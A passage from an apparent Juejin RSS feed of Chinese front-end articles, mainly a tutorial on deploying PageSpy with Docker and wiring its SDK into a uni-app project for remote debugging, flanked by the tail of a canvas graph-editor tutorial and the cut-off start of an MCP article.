  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">canvas, width = <span class="hljs-number">600</span>, height = <span class="hljs-number">600</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span> = canvas;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span> = canvas.<span class="hljs-title function_">getContext</span>(<span class="hljs-string">"2d"</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span> = width;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span> = height;

    <span class="hljs-comment">// 1. 初始化空图</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Graph</span>();
    <span class="hljs-comment">// 2. 初始化编辑器</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GraphEditor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">graph</span>);

    <span class="hljs-comment">// 3. 启动动画循环</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">animate</span>();
  }

  <span class="hljs-title function_">animate</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 清空画布（重要！否则画面会重叠）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctx</span>.<span class="hljs-title function_">clearRect</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">width</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">canvas</span>.<span class="hljs-property">height</span>);

    <span class="hljs-comment">// 让编辑器去决定画什么（它包含图和交互UI）</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span>.<span class="hljs-title function_">display</span>();

    <span class="hljs-comment">// 递归调用，保持 60FPS</span>
    <span class="hljs-title function_">requestAnimationFrame</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">animate</span>());
  }
  
  <span class="hljs-comment">// 原来的 display 方法可以删了，或者留着作纪念</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-7">效果讲解</h2>
<p>现在，当你运行页面时，用鼠标点点看看：</p>
<ol>
<li><strong>高亮 (Hover)</strong>：创建一个点后，鼠标移到点上会有蓝色高亮。</li>
<li><strong>虚拟连线 (Intent)</strong>：会有虚拟连线，引导直线方向。</li>
<li><strong>删除点和线</strong>：当你右键删除点时，<code>Graph</code> 类的 <code>removePoint</code> 不仅删了点，还顺手把连接这个点的所有线段都干掉了。</li>
</ol>
<p>如果看解释有点晕，试一试就知道了！！！！</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c6697f82e36b4388aa88f8c482393d1c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765637930&amp;x-signature=%2BU0fupj6cHg23SaulXlzYZb7NTo%3D" alt="image.png" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-8">最后秀一把？微抖的上帝之手。</h2>
<p>实在没啥可以秀的，非要秀，我直接给你画个爱心：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/85ff47c80a2048eab6c71734f7e9b8d9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5oCqdg==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765637930&amp;x-signature=Aeuh9lvBuCN8GmVJNYsqPu5T%2BM8%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[uni-app 也能远程调试？使用 PageSpy 打开调试的新大门！]]></title>    <link>https://juejin.cn/post/7580310413754302514</link>    <guid>https://juejin.cn/post/7580310413754302514</guid>    <pubDate>2025-12-06T15:01:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580310413754302514" data-draft-id="7580277964342181898" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="uni-app 也能远程调试？使用 PageSpy 打开调试的新大门！"/> <meta itemprop="keywords" content="前端,uni-app,微信小程序"/> <meta itemprop="datePublished" content="2025-12-06T15:01:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="不如摸鱼去"/> <meta itemprop="url" content="https://juejin.cn/user/26044011388510"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            uni-app 也能远程调试？使用 PageSpy 打开调试的新大门！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/26044011388510/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    不如摸鱼去
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T15:01:59.000Z" title="Sat Dec 06 2025 15:01:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是不如摸鱼去，wot-ui 的“主理人”，欢迎来到我的 uni-app 分享专栏。</p>
<p>如果你是一个前端开发，我想你肯定经历过测试、项目验收时报障，本地却无法复现的情况，又或者本地无法满足复现环境的情况。这时候的你是不是抓耳挠腮不知所措？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/79c3572bbc0943c0954b2749ae524ccb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=udSHLtVz6PSF%2BXVKRB01Il9zR1Y%3D" alt="" loading="lazy"/></p>
<p>等到测试反馈，流程慢如闪电？</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17c5d4c22d6942708693479c5000cc2a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=oEwCbL1KjhxZG3CONkKS%2B3jIyr4%3D" alt="" loading="lazy"/></p>
<p>当然，解决方案肯定是有的，埋点、vConsole 以及远程调试工具可以帮我们解决这一问题，本文将会使用 PageSpy 结合 uni-app 模板 wot-starter 实践 uni-app 的远程调试。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a52efb1479c4904b6a03313971bf94e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=vB4uZrLJEO36jI80wHYnRohpPMM%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">为什么要远程调试？</h2>
<blockquote>
<p>以下内容来自 PageSpy 官网，我认为非常有道理。</p>
</blockquote>
<p>任何无法在本地使用控制台调试的场景，都是 PageSpy 可以大显身手的时候！ 一起来看下面的几个场景案例：</p>
<ul>
<li>本地调试 H5、Webview 应用：移动端屏幕太小，传统调试面板操作不便、显示不友好，且容易出现信息截断；</li>
<li>远程办公、跨地区协同：传统沟通方式（邮件、电话、视频会议）效率低，故障信息不完整，容易误解误判；</li>
<li>用户终端白屏问题排查：数据监控、日志分析等传统方式依赖排障人员对业务和技术的深入理解，定位效率低；</li>
</ul>
<h2 data-id="heading-1">PageSpy 是什么？</h2>
<p>PageSpy 是一款用来调试 Web / ReactNative / 小程序 / 鸿蒙 APP 等平台项目的工具。支持 Web 的远程调试工具不少，但能支持 uni-app 的调试工具真的是凤毛麟角了。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/074d879cc62b4d4b93902328a7464624~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=H%2BewD8SXp9Qy%2FrJ4V9gccx8PoWE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-2">PageSpy 如何使用？</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/59c1c8222888404d91d0bbfeaa0e8530~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=glxA9BBRO8SQ96KeCphc%2BIp%2F4E4%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">部署</h3>
<p>部署文档见部署说明：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.pagespy.org%2F%23%2Fdocs%2Fdeploy-guide%25EF%25BC%258C%25E8%25BF%2599%25E9%2587%258C%25E6%2588%2591%25E4%25BB%25AC%25E9%2580%2589%25E6%258B%25A9%25E4%25BD%25BF%25E7%2594%25A8" target="_blank" title="https://www.pagespy.org/#/docs/deploy-guide%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E9%80%89%E6%8B%A9%E4%BD%BF%E7%94%A8" ref="nofollow noopener noreferrer">www.pagespy.org/#/docs/depl…</a> Docker 部署（正好买了个轻量级服务器没用）：</p>
<pre><code class="hljs language-sh" lang="sh">docker run -d --restart=always -v ./log:/app/log -v ./data:/app/data -p 6752:6752 --name=<span class="hljs-string">"pageSpy"</span> ghcr.io/huolalatech/page-spy-web:latest
</code></pre>
<p>执行完成后，打开浏览器访问 <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3A6752" target="_blank" title="http://localhost:6752" ref="nofollow noopener noreferrer">http://localhost:6752</a> 即可访问服务。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7eb761bbe09d41639cadcf734625e763~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=6IR7n1xKYPzxrjGRz3NmCcRAl%2Fk%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">使用</h3>
<p>参见小程序快速上手文档：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.pagespy.org%2F%23%2Fdocs%2Fminiprogram" target="_blank" title="https://www.pagespy.org/#/docs/miniprogram" ref="nofollow noopener noreferrer">www.pagespy.org/#/docs/mini…</a></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c84bcddd25e4962ad7851060f10af77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=hreqz0%2BFpopVrypGbHT2xDgO3Ak%3D" alt="" loading="lazy"/></p>
<p>在 wot-starter 中安装 <code>@huolala-tech/page-spy-uniapp</code></p>
<pre><code class="hljs language-sql" lang="sql">pnpm <span class="hljs-keyword">add</span> <span class="hljs-variable">@huolala</span><span class="hljs-operator">-</span>tech<span class="hljs-operator">/</span>page<span class="hljs-operator">-</span>spy<span class="hljs-operator">-</span>uniapp<span class="hljs-variable">@latest</span>
</code></pre>
<p>在 main.ts 中引入 SDK 并实例化，可通过配置项 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.pagespy.org%2F%23%2Fdocs%2Fapi" target="_blank" title="https://www.pagespy.org/#/docs/api" ref="nofollow noopener noreferrer">www.pagespy.org/#/docs/api</a> 自定义 SDK 的行为：</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 引入 SDK</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">PageSpy</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@huolala-tech/page-spy-uniapp'</span>
<span class="hljs-keyword">import</span> { createSSRApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">'uno.css'</span>

<span class="hljs-keyword">const</span> $pageSpy = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageSpy</span>({
  <span class="hljs-attr">api</span>: <span class="hljs-string">'&lt;your-pagespy-host&gt;'</span>, <span class="hljs-comment">// 这里替换成你的 pagespy 地址</span>
  <span class="hljs-attr">enableSSL</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 视情况开启</span>
})

<span class="hljs-keyword">const</span> pinia = <span class="hljs-title function_">createPinia</span>()
pinia.<span class="hljs-title function_">use</span>(persistPlugin)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createApp</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createSSRApp</span>(<span class="hljs-title class_">App</span>)
  <span class="hljs-comment">// 全局挂载</span>
  app.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">$pageSpy</span> = $pageSpy
  app.<span class="hljs-title function_">use</span>(router)
  app.<span class="hljs-title function_">use</span>(pinia)
  <span class="hljs-keyword">return</span> {
    app,
  }
}
</code></pre>
<p>执行 <code>pnpm dev:mp-weixin</code>后，我们打开部署的 PageSpy 点击<code>开始调试</code>就可以使用了！</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/76641284beb5416090306dee51696d3a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=WxwFHk%2FcI%2FYmenHHnHZZzj%2FKvYM%3D" alt="" loading="lazy"/></p>
<p>我们可以看到有输出、网络、存储等内容。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c72dce76098f46568f69edc4b7ec1a77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiN5aaC5pG46bG85Y67:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765638119&amp;x-signature=mvUqMplRs%2BBS%2BgBZnjx4Y53ytQI%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">总结</h2>
<p>今天我们在 wot-starter 中简单尝试了下 PageSpy 的功能，其实 PageSpy 在 web 上有更强大的能力，不过我们主要关注它在小程序/uni-app 上的表现，更多能力大家可以自行探索了。还有大家可以多多关注 PageSpy 和 wot-starter 为他们点赞哦👍。</p>
<h2 data-id="heading-6">参考资料</h2>
<p>PageSpy: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.pagespy.org%2F%23%2F" target="_blank" title="https://www.pagespy.org/#/" ref="nofollow noopener noreferrer">www.pagespy.org/#/</a><br/>
wot-starter: <a href="https://link.juejin.cn?target=https%3A%2F%2Fstarter.wot-ui.cn%2F" target="_blank" title="https://starter.wot-ui.cn/" ref="nofollow noopener noreferrer">starter.wot-ui.cn/</a></p>
<h2 data-id="heading-7">往期精彩</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FrnUBwZ2oyt90jJof5IrHgA" target="_blank" title="https://mp.weixin.qq.com/s/rnUBwZ2oyt90jJof5IrHgA" ref="nofollow noopener noreferrer">Trae SOLO 正式发布了？我用它将像老乡鸡那样做饭小程序开源了！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F2NAqxoP9sF4uwuMUtasmig" target="_blank" title="https://mp.weixin.qq.com/s/2NAqxoP9sF4uwuMUtasmig" ref="nofollow noopener noreferrer">老乡鸡也开源？我用 Trae SOLO 做了个像老乡鸡那样做饭小程序！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FYH7v_c0MNZ39IheitqYLLw" target="_blank" title="https://mp.weixin.qq.com/s/YH7v_c0MNZ39IheitqYLLw" ref="nofollow noopener noreferrer">当年偷偷玩小霸王，现在偷偷用 Trae Solo 复刻坦克大战</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F6vI325-SemN9wkBgic-UAw" target="_blank" title="https://mp.weixin.qq.com/s/6vI325-SemN9wkBgic-UAw" ref="nofollow noopener noreferrer">告别 HBuilderX，拥抱现代化！这个模板让 uni-app 开发体验起飞</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F_iOsOmnJJ_2GJ0E_QRtqqg" target="_blank" title="https://mp.weixin.qq.com/s/_iOsOmnJJ_2GJ0E_QRtqqg" ref="nofollow noopener noreferrer">uni-app 还在手写请求？alova 帮你全搞定！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FrHJVlbVg8PkGpzfEEtZmIw" target="_blank" title="https://mp.weixin.qq.com/s/rHJVlbVg8PkGpzfEEtZmIw" ref="nofollow noopener noreferrer">uni-app 无法实现全局 Toast？这个方法做到了！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fnnmu91kclQHnE-1TAn11Tg" target="_blank" title="https://mp.weixin.qq.com/s/nnmu91kclQHnE-1TAn11Tg" ref="nofollow noopener noreferrer">Vue3 uni-app 主包 2 MB 危机？1 个插件 10 分钟瘦身</a></p>
<p><em><strong>欢迎评论区沟通、讨论👇👇</strong></em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别“接口地狱”，MCP 协议如何让 AI Agent 像乐高一样即插即用？]]></title>    <link>https://juejin.cn/post/7580280096059899931</link>    <guid>https://juejin.cn/post/7580280096059899931</guid>    <pubDate>2025-12-06T13:16:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580280096059899931" data-draft-id="7580303864604852233" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别“接口地狱”，MCP 协议如何让 AI Agent 像乐高一样即插即用？"/> <meta itemprop="keywords" content="人工智能,OpenAI,AI编程"/> <meta itemprop="datePublished" content="2025-12-06T13:16:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="泯泷"/> <meta itemprop="url" content="https://juejin.cn/user/317122698296024"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别“接口地狱”，MCP 协议如何让 AI Agent 像乐高一样即插即用？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/317122698296024/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    泯泷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-06T13:16:03.000Z" title="Sat Dec 06 2025 13:16:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 